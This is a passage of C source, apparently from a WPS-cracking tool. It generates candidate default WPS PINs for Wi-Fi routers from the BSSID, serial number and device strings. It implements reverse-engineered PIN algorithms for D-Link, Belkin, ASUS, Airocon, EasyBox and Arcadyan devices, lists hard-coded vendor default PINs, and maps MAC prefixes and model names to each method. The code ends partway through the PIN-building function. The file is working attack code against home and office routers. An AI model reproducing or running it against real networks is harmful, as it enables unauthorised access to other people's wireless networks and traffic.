/*
 * Functions to generate default WPS PIN with BSSID and WPS Device Data of AP
 * 
 * Reference: https://3wifi.stascorp.com/wpspin
 *            http://standards-oui.ieee.org/oui.txt
 *            https://code.wireshark.org/review/gitweb?p=wireshark.git;a=blob_plain;f=manuf;hb=HEAD
 */

#include "macpins.h"

/**
 * All MAC of AP (BSSID) without ':', e.g 0123456789AB,
 * pin is mod (%) by 10000000
 */

/**
 * Generate default pin with last 24-bit, 28-bit, 32-bit, 36-bit, 40-bit, 44-bit, 48-bit of mac
 * Technical details:
 * Pin = MAC[7..12]
 * http://hellocow.cn/2012/04/get-the-pin-in-router-mac-address-start-with-c83a35-00b00c-081075/
 * 
 * @params char* mac  The BSSID without ':'
 * @params int   last Last x hex character of BSSID to calculate
 * 
 * @return int   7-digit pin
 */
int mac_byte_pin(char *mac, int last)
{
	char key[13];
	long long int pin;
	int i;

	if (last > 12 || last < 6) {
		last = 6;
	}
	i = 12 - last;
	strncpy(key, mac+i, last);
	key[last] = '\0';
	pin = strtoll(key, NULL, 16);

	return pin % 10000000;
}

/**
 * Generate default pin with Reverse byte from last 24-bit, 32-bit, 48-bit of mac
 * 
 * @params char* mac  The BSSID without ':'
 * @params int   last Last x hex character of BSSID to calculate
 * 
 * @return int   7-digit pin
 */
int mac_reverse_byte_pin(char *mac, int last)
{
	char key[13];
	long long int pin;
	int i, j;

	if (last > 12 || last < 6) {
		last = 6;
	}
	for(i=0, j=12-2; i < last; i+=2, j-=2) {
		key[i] = mac[j];
		key[i+1] = mac[j+1];
	}
	key[last] = '\0';
	pin = strtoll(key, NULL, 16);

	return pin % 10000000;
}

/**
 * Generate default pin with Reverse nibble from last 24-bit, 32-bit, 48-bit of mac
 * 
 * @params char* mac  The BSSID without ':'
 * @params int   last Last x hex character of BSSID to calculate
 * 
 * @return int   7-digit pin
 */
int mac_reverse_nibble_pin(char *mac, int last)
{
	char key[13];
	long long int pin;
	int i, j;

	if (last > 12 || last < 6) {
		last = 6;
	}
	for(i=0, j=12-1; i < last; ++i, --j) {
		key[i] = mac[j];
	}
	key[last] = '\0';
	pin = strtoll(key, NULL, 16);

	return pin % 10000000;
}

/**
 * Generate default pin with Reverse bits from last 24-bit, 32-bit, 48-bit of mac
 * 
 * @params char* mac  The BSSID without ':'
 * @params int   last Last x hex character of BSSID to calculate
 * 
 * @return int   7-digit pin
 */
int mac_reverse_bit_pin(char *mac, int last)
{
	char key[64];
	int i, r;
	long long int pin, q;

	if (last > 12 || last < 6) {
		last = 6;
	}
	i = 12 - last;
	strncpy(key, mac+i, last);
	key[last] = '\0';
	pin = strtoll(key, NULL, 16);

	i=0;
	do {
		q = pin/2;
		r = pin%2;
		key[i++] = r+'0';
		pin = q;
	} while (q);
	while(i<last*4) {
		key[i++] = '0';
	}
	key[i] = '\0';
	pin = strtoll(key, NULL, 2);

	return pin % 10000000;
}

/**
 * Generate default pin for ASUS router
 * Technical details:
 * https://forum.antichat.ru/posts/3978417/
 * 
 * @params char* mac The BSSID without ':'
 * 
 * @return int   7-digit pin
 */
int mac_asus_pin(char *mac)
{
	char key[13];
	int b[6], pin[7];
	int i, j;

	key[2] = '\0';
	for (i=j=0; i<6; i++, j+=2) {
		key[0] = mac[j];
		key[1] = mac[j+1];
		b[i] = strtol(key, NULL, 16);
	}
	for (i = 0; i < 7; i++)	{
		pin[i] = (b[i % 6] + b[5]) % (10 - ((i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7));
	}
	sprintf(key, "%d%d%d%d%d%d%d", pin[0], pin[1], pin[2], pin[3], pin[4], pin[5], pin[6]);

	return strtoll(key, NULL, 10) % 10000000;
}

/**
 * Generate default pin for D-Link router
 * Technical details:
 * http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/
 * 
 * @params char* mac The BSSID without ':'
 * @params int   add The addicional number to calculate, default is 0 or 1
 * 
 * @return int   7-digit pin
 */
int mac_dlink_pin(char *mac, int add)
{
	int nic=0, pin=0;
	char buff[10];

	nic = strtol(strncpy(buff, mac+6, sizeof(buff)), NULL, 16);
	nic = nic + add;

	pin = nic ^ 0x55AA55;
	pin = pin ^ (((pin & 0x0F) << 4) +
		 ((pin & 0x0F) << 8) +
		 ((pin & 0x0F) << 12) +
		 ((pin & 0x0F) << 16) +
		 ((pin & 0x0F) << 20));
	pin = pin % 10000000;

	if (pin < 1000000)
	{
		pin += ((pin % 9) * 1000000) + 1000000;
	}

	return pin % 10000000;
}

/**
 * Generate default pin for Airocon Realtek router
 * Technical details:
 * https://forum.antichat.ru/posts/3975451/
 * 
 * @params char* mac The BSSID without ':'
 * 
 * @return int   7-digit pin
 */
int mac_airocon_pin(char *mac)
{
	char key[13];
	int b[6];
	int i, j, pin;

	key[2] = '\0';
	for (i=j=0; i<6; i++, j+=2) {
		key[0] = mac[j];
		key[1] = mac[j+1];
		b[i] = strtol(key, NULL, 16);
	}

	pin = ((b[0] + b[1]) % 10)
		+ (((b[5] + b[0]) % 10) * 10)
		+ (((b[4] + b[5]) % 10) * 100)
		+ (((b[3] + b[4]) % 10) * 1000)
		+ (((b[2] + b[3]) % 10) * 10000)
		+ (((b[1] + b[2]) % 10) * 100000)
		+ (((b[0] + b[1]) % 10) * 1000000);

	return pin  % 10000000;
}

/**
 * Generate default pin with Inv NIC
 * 
 * @params char* mac The BSSID without ':'
 * 
 * @return int   7-digit pin
 */
int mac_inv_nic_pin(char *mac)
{
	char key[13];
	int pin;

	strncpy(key, mac+6, 6);
	key[6] = '\0';
	pin = strtol(key, NULL, 16);

	return (~pin & 0xFFFFFF) % 10000000;
}

/**
 * Generate default pin with NIC * 2 or NIC * 3
 * 
 * @params char* mac The BSSID without ':'
 * @params int   x   The addicional number to calculate, default is 2 or 3
 * 
 * @return int   7-digit pin
 */
int mac_nicx_pin(char *mac, int x)
{
	char key[13];
	int pin;

	strncpy(key, mac+6, 6);
	key[6] = '\0';
	pin = strtol(key, NULL, 16);

	return (pin * x) % 10000000;
}

/**
 * Generate default pin with OUI + NIC (add), OUI - NIC (sub) OR OUI ^ NIC (xor)
 * 
 * @params char* mac The BSSID without ':'
 * @params int   opt The char option for add ('+'), sub ('-') or xor ('^')
 * 
 * @return int   7-digit pin
 */
int mac_oui_nic_pin(char *mac, int opt)
{
	char key[13];
	int pin, oui, nic;

	strncpy(key, mac, 6);
	key[6] = '\0';
	oui = strtol(key, NULL, 16);
	strncpy(key, mac+6, 6);
	key[6] = '\0';
	nic = strtol(key, NULL, 16);

	if(opt == '+' || opt == 1) {
		pin = ((oui + nic) % 0x1000000);
	} else if (opt == '-' || opt == -1) {
		if (nic < oui) {
			pin = oui - nic;
		} else {
			pin = (oui + 0x1000000 - nic) & 0xFFFFFF;
		}
	} else {
		pin = oui ^ nic;
	}

	return pin % 10000000;
}

/*
	universal algorithm, returns pin derived from MAC and S/N
	used by: Belkin, DSL-EasyBox, Arcadyan, and possibly other manufacturers

	reverse-engineered by Stas'M
*/
int mac_sn_pin(char *mac, char *serial, int *init_bx, int add)
{
	int sn[4], nic[4];
	int mac_len, serial_len;
	int k1, k2, pin;
	int xor, i, j;
	char buff_mac[24], buff_serial[6];
	char key[2];
	int init_bk1, init_bk2, init_k1, init_k2, init_pin, init_xor, init_sub, init_sk, init_skv;
	long long unsigned int mac_i;

	mac_i = strtoll(mac, NULL, 16);
	mac_i = mac_i + add;
	sprintf(buff_mac, "%llX", mac_i);

	serial_len = strlen(serial);
	if (serial_len>=4) {
		strncpy(buff_serial, serial+(serial_len-4), 4);
	} else {
		for (i = 0; i < 4-serial_len; ++i) {
			buff_serial[i] = '0';
		}
		buff_serial[i] = '\0';
		strcat(buff_serial, serial);
	}
	buff_serial[4] = '\0';
	serial_len = strlen(buff_serial);

	key[1] = '\0';
	/* Get the four least significant digits of the serial number */
	for (i=0; i<4; ++i) {
		key[0] = buff_serial[i];
		sn[i] = strtol(key, NULL, 16);
	}

	/* Get the four least significant nibbles of the MAC address */
	nic[0] = (mac_i & 0xFFFF) >> 12;
	nic[1] = (mac_i & 0xFFF) >> 8;
	nic[2] = (mac_i & 0xFF) >> 4;
	nic[3] = mac_i & 0xF;

	/*
		init vector:
		bk1  - k1 sum composite bits (0~255)
		bk2  - k2 sum composite bits (0~255)
		bx[] - xor composite bits (array of 0~255)
		k1   - k1 init nibble (0~15)
		k2   - k2 init nibble (0~15)
		pin  - pin init value (0~9999999)
		xor  - xor init nibble (0~15)
		sub  - substraction mode (0 - no sub, 1 - substraction, 2 - addition)
		sk   - substraction multiple coefficient (0 - skv value, 1 - k1, 2 - k2)
		skv  - substraction multiple value
	*/
	init_bk1 = 60;
	init_bk2 = 195;
	init_k1 = 0;
	init_k2 = 0;
	init_pin = 0;
	init_xor = 0;
	init_sub = 0;
	init_sk = 0;
	init_skv = 0;

	k1 = init_k1 & 0xF;
	i = 0;
	while (init_bk1)
	{
		// 0      1      2      3      4     5     6     7
		// nic[0] nic[1] nic[2] nic[3] sn[0] sn[1] sn[2] sn[3]
		if (init_bk1 & 1)
		{
			k1 += (i < 4 ? nic[i] : sn[i - 4]);
			k1 &= 0xF;
		}
		init_bk1 >>= 1;
		i++;
	}
	k2 = init_k2 & 0xF;
	i = 0;
	while (init_bk2)
	{
		// 0      1      2      3      4     5     6     7
		// nic[0] nic[1] nic[2] nic[3] sn[0] sn[1] sn[2] sn[3]
		if (init_bk2 & 1)
		{
			k2 += (i < 4 ? nic[i] : sn[i - 4]);
			k2 &= 0xF;
		}
		init_bk2 >>= 1;
		i++;
	}

	pin = init_pin;
	for (j = 0; j < 7; j++)
	{
		xor = init_xor & 0xF;
		i = 0;
		while (init_bx[j])
		{
			// 0   1   2       3       4       5      6      7
			// k1, k2, nic[1], nic[2], nic[3], sn[1], sn[2], sn[3]
			if (init_bx[j] & 1)
			{
				xor ^= (i > 4 ? sn[i - 4] : (i > 1 ? nic[i - 1] : (i > 0 ? k2 : k1)));
			}
			init_bx[j] >>= 1;
			i++;
		}
		pin <<= 4;
		pin |= xor;
	}
	switch (init_sub)
	{
		case 1: // spoiled from Belkin's reversed algo
			pin = (pin % 10000000) - ((pin / 10000000) * (init_sk > 1 ? k2 : (init_sk > 0 ? k1 : init_skv)));
		case 2:
			pin = (pin % 10000000) + ((pin / 10000000) * (init_sk > 1 ? k2 : (init_sk > 0 ? k1 : init_skv)));
	}
	return pin % 10000000;
}

/**
 * Generate default pin for Belkin router
 * Technical details:
 * http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/
 * 
 * @params char* mac    The BSSID without ':'
 * @params char* serial The serial number of AP
 * 
 * @return int   7-digit pin
 */
int mac_belkin_pin(char *mac, char *serial) {
	int bx[7] = {66, 129, 209, 10, 24, 3, 39};
	return mac_sn_pin(mac, serial, bx, 0);
}

/**
 * Generate default pin for Vodafone EasyBox router
 * Technical details:
 * https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130805-0_Vodafone_EasyBox_Default_WPS_PIN_Vulnerability_v10.txt
 * 
 * @params char* mac    The BSSID without ':'
 * @params char* serial The serial number of AP
 * 
 * @return int   7-digit pin
 */
int mac_vodafone_easybox_pin(char *mac, char *serial) {
	char key[13];
	char *ser;
	long int pin;

	int bx[7] = {129, 65, 6, 10, 136, 80, 33};
	if (strlen(serial) == 0) {
		strncpy(key, mac+8, 4);
		key[4] = '\0';
		pin = strtol(key, NULL, 16);
		sprintf(key, "%li", pin);
		ser = key;
	} else {
		ser = serial;
	}

	return mac_sn_pin(mac, ser, bx, 0);
}

/**
 * Generate default pin for Livebox Arcadyan router
 * Technical details:
 * https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html
 * 
 * @params char* mac    The BSSID without ':'
 * @params char* serial The serial number of AP
 * 
 * @return int   7-digit pin
 */
int mac_livebox_arcadyan_pin(char *mac, char *serial) {
	int bx[7] = {129, 65, 6, 10, 136, 80, 33};
	//mac-2
	return mac_sn_pin(mac, serial, bx, -2);
}

/**
 * Return various statics pins
 * 
 * @params char* mac The BSSID without ':', but not will used
 * @params int*  i   index of static pin
 * 
 * @return int*  7-digit pin or -1 main "empty" pin
 */
int mac_static_pin(char *mac, int i) {
	int defaul_pins[STATIC_PIN_SIZE] = {
		1234567, /* Cisco */
		2017252, /* Broadcom 1 */
		4626484, /* Broadcom 2 */
		7622990, /* Broadcom 3 */
		6232714, /* Broadcom 4 */
		1086411, /* Broadcom 5 */
		3195719, /* Broadcom 6 */
		3043203, /* Airocon 1 */
		7141225, /* Airocon 2 */
		6817554, /* DSL-2740R */
		9566146, /* Realtek 1 */
		9571911, /* Realtek 2 */
		2085483, /* Upvel */
		4397768, /* UR-814AC */
		529417, /* UR-825AC */
		9995604, /* Onlime */
		3561153, /* Edimax */
		6795814, /* Thomson */
		3425928, /* HG532x */
		9575521, /* CBN ONO */
		-1 /* <empty> https://hg658c.wordpress.com/2015/06/20/obtaining-the-wifi-password-in-a-few-seconds-using-wps/ */
	};
	if (i < STATIC_PIN_SIZE) {
		return defaul_pins[i];
	} else {
		return 0;
	}
}

int mac_pin_find_oui(char *oui, char *mac) {
	int i, found;
	char needle[10];

	found = 0;
	for (i=6; i<9; ++i) {
		strncpy(needle, mac, i);
		needle[i] = '\0';
		strcat(needle, "|");
		if(strstr(oui, needle) != NULL) {
			found = 1;
			break;
		}
	}

	return found;
}

int mac_pin_find_kword(char *haystack, char *needle) {
	char *pch, *copie;
	int found;

	found = 0;
	copie = strdup(needle);
	pch = strtok(copie, " ");
	while (pch != NULL) {
		if(strstr(haystack, pch) != NULL) {
			found = 1;
			break;
		}
		pch = strtok(NULL, " ");
	}
	if(copie) free(copie);

	return found;
}

/**
 * Generate various defaults pins with MAC and WPS Device Data
 * 
 * @params int* len Length of array by reference
 * 
 * @return int*  Pointer to all 7-digit pin in an array
 */
int *build_mac_pins(int *len)
{
	int i, max, index;
	int *pins = NULL;
	char *vendor, *mac = NULL, *haystack = NULL, *serial = NULL;
	struct wps_device_data *dev = NULL;
	struct wps_data *wps = NULL;
	struct mac_pin_function func[] = {
		{mac_byte_pin, 6, 0, 0, "0E5D4E|107BEF|14A9E3|28285D|2A285D|32B2DC|381766|404A03|4E5D4E|5067F0|5CF4AB|6A285D|8E5D4E|AA285D|B0B2DC|C86C87|CC5D4E|CE5D4E|EA285D|E243F6|EC43F6|EE43F6|F2B2DC|FCF528|FEF528|4C9EFF|0014D1|84C9B2|14D64D|9094E4|BCF685|C4A81D|00664B|087A4C|14B968|2008ED|346BD3|4CEDDE|786A89|88E3AB|D46E5C|E8CD2D|EC233D|ECCB30|F49FF3|20CF30|90E6BA|E0CB4E|D4BF7F4|F8C091|001CDF|002275|08863B|00B00C|081075|C83A35|0022F7|001F1F|00265B|68B6CF|788DF7|BC1401|202BC1|308730|5C4CA9|62233D|623CE4|623DFF|6253D4|62559C|626BD3|627D5E|6296BF|62A8E4|62B686|62C06F|62C61F|62C714|62CBA8|62CDBE|62E87B|6416F0|6A1D67|6A233D|6A3DFF|6A53D4|6A559C|6A6BD3|6A96BF|6A7D5E|6AA8E4|6AC06F|6AC61F|6AC714|6ACBA8|6ACDBE|6AD15E|6AD167|721D67|72233D|723CE4|723DFF|7253D4|72559C|726BD3|727D5E|7296BF|72A8E4|72C06F|72C61F|72C714|72CBA8|72CDBE|72D15E|72E87B|0026CE|9897D1|E04136|B246FC|E24136|00E020|5CA39D|D86CE9|DC7144|801F02|E47CF9|00A026|A0F3C1|647002|B0487A|F81A67|F8D111|803F5D|00163E|00159C|",
		"ASUS BELKIN B-KYUNG CONCEPTRONIC D-LINK EDIMAX HITRON HUAWEI KEENETIC KUZOMI MITRASTAR PIX-LINK RALINK SAMSUNG TECNOMEN TELDAT TENDA TP-LINK TRENDNET UPVEL XENSOURCE WINSTARS ZYXEL",
		"3G-6210N 3G-6220N C300BRS4A CDE-30364 DEL1201-T10A DIR-300NRU DIR-620 DSL-100HN-T1 DSL-2600U F5D8231-4V5000 F5D8235-4V1000 F9K1104 HG532E HG566A HGW-2501GN-R2 IROUTER1104-W K1500 K1550 LV-WR02 NDMS REPEATER REPETIDOR RT-G32 RT-N13U SMT-G7440 SWL TD-W8951ND TD-W8961ND TEW-651BR UR-309BN UR-309NB W309R",
		""}, /* 24-bit PIN */ /* 00 */
		{mac_byte_pin, 7, 0, 0, "200BC7|4846FB|D46AA8|F84ABF|",
		"HUAWEI",
		"HG8245H",
		""}, /* 28-bit PIN */ /* 01 */
		{mac_byte_pin, 8, 0, 0, "000726|D8FEE3|FC8B97|1062EB|1C5F2B|48EE0C|908D78|E8CC18|2CAB25|10BF48|14DAE9|3085A9|50465D|5404A6|C86000|F46D04|3085A9|801F02|",
		"ASUS BEELINE D-LINK EDIMAX",
		"BR6228GNS BR6428GN DAP-1360 DIR-300 DIR-825AC EA-N66 RT-N13U",
		""}, /* 32-bit PIN */ /* 02 */
		{mac_byte_pin, 9, 0, 0, "", "", "", ""}, /* 36-bit PIN */ /* 03 */
		{mac_byte_pin, 10, 0, 0, "", "", "", ""}, /* 40-bit PIN */ /* 04 */
		{mac_byte_pin, 11, 0, 0, "", "", "", ""}, /* 44-bit PIN */ /* 05 */
		{mac_byte_pin, 12, 0, 0, "", "", "", ""}, /* 48-bit PIN */ /* 06 */
		{mac_reverse_byte_pin, 6, 0, 0, "", "", "", ""}, /* Reverse byte 24-bit */ /* 07 */
		{mac_reverse_byte_pin, 8, 0, 0, "", "", "", ""}, /* Reverse byte 32-bit */ /* 08 */
		{mac_reverse_byte_pin, 12, 0, 0, "", "", "", ""}, /* Reverse byte 48-bit */ /* 09 */
		{mac_reverse_nibble_pin, 6, 0, 0, "", "", "", ""}, /* Reverse nibble 24-bit */ /* 10 */
		{mac_reverse_nibble_pin, 8, 0, 0, "", "", "", ""}, /* Reverse nibble 32-bit */ /* 11 */
		{mac_reverse_nibble_pin, 12, 0, 0, "", "", "", ""}, /* Reverse nibble 48-bit */ /* 12 */
		{mac_reverse_bit_pin, 6, 0, 0, "", "", "", ""}, /* Reverse bits 24-bit */ /* 13 */
		{mac_reverse_bit_pin, 8, 0, 0, "", "", "", ""}, /* Reverse bits 32-bit */ /* 14 */
		{mac_reverse_bit_pin, 12, 0, 0, "", "", "", ""}, /* Reverse bits 48-bit */ /* 15 */
		{mac_dlink_pin, 0, 0, 0, "14D64D|1C7EE5|28107B|84C9B2|A0AB1B|B8A386|C0A0BB|CCB255|FC7516|0014D1|D8EB97|",
		"D-LINK TRENDNET",
		"DAP-1155 DAP-1360 DIR-651 DIR-825AC TEW-432BRP TEW-651BR TEW-652BRP TEW-731BR",
		"D-LINK"}, /* D-Link PIN */ /* 16 */
		{mac_dlink_pin, 1, 0, 0, "0018E7|00195B|001CF0|001E58|002191|0022B0|002401|00265A|14D64D|1C7EE5|340804|5CD998|84C9B2|B8A386|C8BE19|C8D3A3|CCB255|0014D1|",
		"D-LINK TRENDNET",
		"DIR-400 DIR-615 DIR-628 DIR-635 DIR-655 DIR-825 DIR-826L DIR-855 DIR-857 TEW-652BRP TEW-673GRU",
		"D-LINK"}, /* D-Link PIN + 1 */ /* 17 */
		{mac_asus_pin, -1, 0, 0, "08606E|0862669|107B44|10BF48|10C37B|14DDA9|1C872C|1CB72C|2C56DC|2CFDA1|305A3A|382C4A|38D547|40167E|50465D|54A050|6045CB|60A44C|704D7B|74D02B|7824AF|9C5C8E|AC220B|AC9E17|B06EBF|BCEE7B|C860007|D017C2|D850E6|E03F49|F0795978|F832E4|00072624|0008A1D3|00177C|001EA6|00304FB|00E04C0|048D38|081077|081078|081079|083E5D|10FEED3C|181E78|1C4419|2420C7|247F20|2CAB25|3085A98C|3C1E04|40F201|44E9DD|48EE0C|5464D9|54B80A|587BE906|60D1AA21|64517E|64D954|6C198F|6C7220|6CFDB9|78D99FD|7C2664|803F5DF6|84A423|88A6C6|8C10D4|8C882B00|904D4A|907282|90F65290|94FBB2|A01B29|A0F3C1E|A8F7E00|ACA213|B85510|B8EE0E|BC3400|BC9680|C891F9|D00ED90|D084B0|D8FEE3|E4BEED|E894F6F6|EC1A5971|EC4C4D|F42853|F43E61|F46BEF|F8AB05|FC8B97|7062B8|78542E|C0A0BB8C|C412F5|C4A81D|E8CC18|EC2280|F8E903F4|",
		"AIROCON ASUS D-LINK REALTEK",
		"DIR-600 DIR-600M DIR-615 DSL-N10 DSL-N10E DSL-N10S DSL-N12E DSL-N12U DSL-N14U RTL867 RTL8 RT-AC51U RT-G32 RT-N10 RT-N10+ RT-N10E RT-N10LX RT-N10P RT-N10PV2 RT-N10U RT-N11P RT-N12 RT-N12+ RT-N12E RT-N12LX RT-N12VP RX3041",
		"ASUS"}, /* ASUS PIN */ /* 18 */
		{mac_airocon_pin, -1, 0, 0, "0007262F|000B2B4A|000EF4E7|001333B|00177C|001AEF|00E04BB3|02101801|0810734|08107710|1013EE0|2CAB25C7|788C54|803F5DF6|94FBB2|BC9680|F43E61|FC8B97|", 
		"AIROCON REALTEK",
		"RTL867 RTL8",
		"AIROCON"}, /* Airocon Realtek */ /* 19 */
		{mac_inv_nic_pin, -1, 0, 0, "", "", "", ""}, /* Inv NIC to PIN */ /* 20 */
		{mac_nicx_pin, 2, 0, 0, "", "", "", ""}, /* NIC * 2 */ /* 21 */
		{mac_nicx_pin, 3, 0, 0, "", "", "", ""}, /* NIC * 3 */ /* 22 */
		{mac_oui_nic_pin, '+', 0, 0, "", "", "", ""}, /* OUI + NIC */ /* 23 */
		{mac_oui_nic_pin, '-', 0, 0, "", "", "", ""}, /* OUI - NIC */ /* 24 */
		{mac_oui_nic_pin, '^', 0, 0, "", "", "", ""}, /* OUI ^ NIC */ /* 25 */
		{mac_belkin_pin, -1, 1, 0, "08863B|94103E|B4750E|C05627|EC1A59|",
		"BELKIN",
		"F5D7234-4 F5D8233-4 F5D9231-4 F6D4230-4 F7D1301 F7D2301 F7D4401 F9J1102 F9J1105 F9K1001 F9K1002 F9K1102 F9K1103 F9K1105 F9K1112 F9K1113 F9K1118",
		"BELKIN"}, /* Belkin PIN */ /* 26 */
		{mac_vodafone_easybox_pin, -1, 1, 0, "00264D|38229D|7C4FB5|",
		"VODAFONE",
		"EASYBOX",
		"VODAFONE"},/* Vodafone EasyBox */ /* 27 */
		{mac_livebox_arcadyan_pin, -1, 1, 0, "1883BF|488D36|4C09D4|507E5D|5CDC96|743170|849CA6|880355|9C80DF|A8D3F7|D0052A|D463FE|",
		"ARCADYAN",
		"ARV7519 LIVEBOX",
		"ARCADYAN"},/* Livebox Arcadyan */ /* 28 */
		{mac_static_pin, 0, 0, 0, "00248C|002618|344DEB|7071BC|E06995|E0CB4E|7054F5|",
		"ATHEROS CISCO HUAWEI LINKSYS",
		"DPC2420 EPC2100R2 EPC2325 HG8245T",
		"CISCO"}, /* Cisco */ /* 29 */
		{mac_static_pin, 1, 0, 0, "ACF1DF|BCF685|C8D3A3|988B5D|001AA9|14144B|EC6264|",
		"BROADCOM D-LINK SAGEMCOM STARNET",
		"AR800 DSL-2640U DSL-2650U DSL-2740U DSL-2750U F@ST FAST3804 MSW41P4",
		"BROADCOM"}, /* Broadcom 1 */ /* 30 */
		{mac_static_pin, 2, 0, 0, "14D64D|1C7EE5|28107B|84C9B2|B8A386|BCF685|C8BE19|",
		"BROADCOM D-LINK",
		"DSL-2600U DSL-2640NRU DSL-2640U DSL-2740U",
		"BROADCOM"}, /* Broadcom 2 */ /* 31 */
		{mac_static_pin, 3, 0, 0, "14D64D|1C7EE5|28107B|B8A386|BCF685|C8BE19|7C034C|",
		"BROADCOM D-LINK SAGEMCOM",
		"DSL-2600U DSL-2640NRU DSL-2640U DSL-2740U F@ST FAST2304",
		"BROADCOM"}, /* Broadcom 3 */ /* 32 */
		{mac_static_pin, 4, 0, 0, "14D64D|1C7EE5|28107B|84C9B2|B8A386|BCF685|C8BE19|C8D3A3|CCB255|FC7516|204E7F|4C17EB|18622C|7C03D8|D86CE9|",
		"BROADCOM D-LINK NETGEAR SAGEMCOM",
		"DSL-2640NRU DSL-2640U DSL-2650NRU DSL-2740NRU DSL-2740U DSL-2750B DSL-2750U F@ST FAST2704R FAST2704 FAST2804 JDGN1000",
		"BROADCOM"}, /* Broadcom 4 */ /* 33 */
		{mac_static_pin, 5, 0, 0, "14D64D|1C7EE5|28107B|84C9B2|B8A386|BCF685|C8BE19|C8D3A3|CCB255|FC7516|204E7F|4C17EB|18622C|7C03D8|D86CE9|",
		"BROADCOM D-LINK NETGEAR SAGEMCOM",
		"DSL-2640NRU DSL-2640U DSL-2650NRU DSL-2740NRU DSL-2740U DSL-2750B DSL-2750U F@ST FAST2704R FAST2704 FAST2804 JDGN1000",
		"BROADCOM"}, /* Broadcom 5 */ /* 34 */
		{mac_static_pin, 6, 0, 0, "14D64D|1C7EE5|28107B|84C9B2|B8A386|BCF685|C8BE19|C8D3A3|CCB255|FC7516|204E7F|4C17EB|18622C|7C03D8|D86CE9|",
		"BROADCOM D-LINK NETGEAR SAGEMCOM",
		"DSL-2640NRU DSL-2640U DSL-2650NRU DSL-2740NRU DSL-2740U DSL-2750B DSL-2750U F@ST FAST2704R FAST2704 FAST2804 JDGN1000",
		"BROADCOM"}, /* Broadcom 6 */ /* 35 */
		{mac_static_pin, 7, 0, 0, "181E78|40F201|44E9DD|D084B0|",
		"AIROCON",
		"F@ST FAST 1744",
		"AIROCON"}, /* Airocon 1 */ /* 36 */
		{mac_static_pin, 8, 0, 0, "84A423|8C10D4|88A6C6|",
		"AIROCON",
		"F@ST FAST 1744",
		"AIROCON"}, /* Airocon 2 */ /* 37 */
		{mac_static_pin, 9, 0, 0, "00265A|1CBDB9|340804|5CD998|84C9B2|FC7516|",
		"D-LINK",
		"DSL-2740R",
		"DSL-2740R"}, /* DSL-2740R */ /* 38 */
		{mac_static_pin, 10, 0, 0, "0014D1|000C42|000EE8|",
		"INTELLINET TECHNICLAN REALTEK TRENDNET ",
		"RTL8 TEW-432BRP TEW-432BRP WAR-54GS",
		"REALTEK"}, /* Realtek 1 */ /* 39 */
		{mac_static_pin, 11, 0, 0, "007263|E4BEED|",
		"NETIS REALTEK",
		"WF2780 RTL8 RTK_AP",
		"REALTEK"}, /* Realtek 2 */ /* 40 */
		{mac_static_pin, 12, 0, 0, "F8C091|", "UPVEL", "UR-315BN UR-325BN", "UPVEL"}, /* Upvel */ /* 41 */
		{mac_static_pin, 13, 0, 0, "D4BF7F60|", "UPVEL", "UR-814AC", "UR-814AC"}, /* UR-814AC */ /* 42 */
		{mac_static_pin, 14, 0, 0, "D4BF7F5|", "UPVEL", "UR-825AC UR-825N4G", "UR-825AC"}, /* UR-825AC */ /* 43 */
		{mac_static_pin, 15, 0, 0, "D4BF7F|F8C091|784476|0014D1|",
		"REALTEK TRENDNET UPVEL TOTOLINK",
		"N150RT N300RT ONLIME RARELY RTK_AP RTK_AP_2X RTL8196E RTL8 TEW-637AP TEW-638APB UR-315BN UR-319BN",
		"ONLIME"}, /* Onlime */ /* 44 */
		{mac_static_pin, 16, 0, 0, "801F02|00E04C|", "EDIMAX", "BR6228GNS BR6258GN BR6428GN BR6428NS", "EDIMAX"}, /* Edimax */ /* 45 */
		{mac_static_pin, 17, 0, 0, "002624|4432C8|88F7C7|CC03FA|", "THOMSON TECHNICOLOR", "THOMSON TECHNICOLOR", "THOMSON"}, /* Thomson */ /* 46 */
		{mac_static_pin, 18, 0, 0, "00664B|086361|087A4C|0C96BF|14B968|2008ED|2469A5|346BD3|786A89|88E3AB|9CC172|ACE215|D07AB5|CCA223|E8CD2D|F80113|F83DFF|",
		"HUAWEI",
		"ECHOLIFE HG532E HG532N HG532S",
		"HG532"}, /* HG532x */ /* 47 */
		{mac_static_pin, 19, 0, 0, "5C353B|DC537C|", "CBN", "CH6640E", "CBN"}, /* CBN ONO */ /* 48 */
		{mac_static_pin, 20, 0, 0, "E46F13|EC2280|1062EB|10BEF5|1C5F2B|802689|A0AB1B|74DADA|9CD643|68A0F6|0C96BF|20F3A3|ACE215|C8D15E|000E8F|D42122|788102|7894B4|D460E3|E06066|004A77|2C957F|64136C|74A78E|88D274|702E22|74B57E|789682|D476EA|38D82F|54BE53|709F2D|94A7B7|981333|CAA366|D0608C|",
		"D-LINK HUAWEI ZTE SERCOMM",
		"B683-24V DIR-620 DIR-825/AC DIR-825/AC/G1 DIR-825AC DIR-825ACG1 DSL-2640U H108N H118N H218N H298N HG658C RV6688BCM S1010 WIFIRE ZXHN",
		""} /* <empty> */ /* 49 */
	};

	*len = sizeof(func)/sizeof(struct mac_pin_function);
	pins = (int*) malloc(*len * sizeof(int));
	if (pins) {
		mac = mac2str(get_bssid(), '\0');
		if (mac) {
			wps = get_wps();
			if (wps && (wps->peer_dev.device_name || wps->peer_dev.manufacturer || wps->peer_dev.model_name)) {
				haystack = (char*) malloc(strlen(wps->peer_dev.device_name) + strlen(wps->peer_dev.manufacturer) + strlen(wps->peer_dev.model_name) + 4);
				strcpy(haystack, wps->peer_dev.device_name);
				strcat(haystack, " ");
				strcat(haystack, wps->peer_dev.manufacturer);
				strcat(haystack, " ");
				strcat(haystack, wps->peer_dev.model_name);
				/* get hex digit to Serial Number */
				max = strlen(wps->peer_dev.serial_number);
				serial = (char*) malloc(max+1);
				for (index=i=0; i<max; ++i)
				{
					if (isxdigit(wps->peer_dev.serial_number[i])) {
						serial[index++] = wps->peer_dev.serial_number[i];
					}
				}
				serial[index] = '\0';
			}
			else {
				if((vendor = get_vendor_string(get_vendor()))) {
					haystack = strdup(vendor);
				}
				else {
					haystack = strdup("Unknown ");
				}
				serial = strdup("");
			}
			/* upcase */
			max = strlen(haystack);
			for(i=0; i<max; ++i) {
				haystack[i] = toupper(haystack[i]);
			}
			/* Set priority each mac_pin functions and get the bigger priority value */
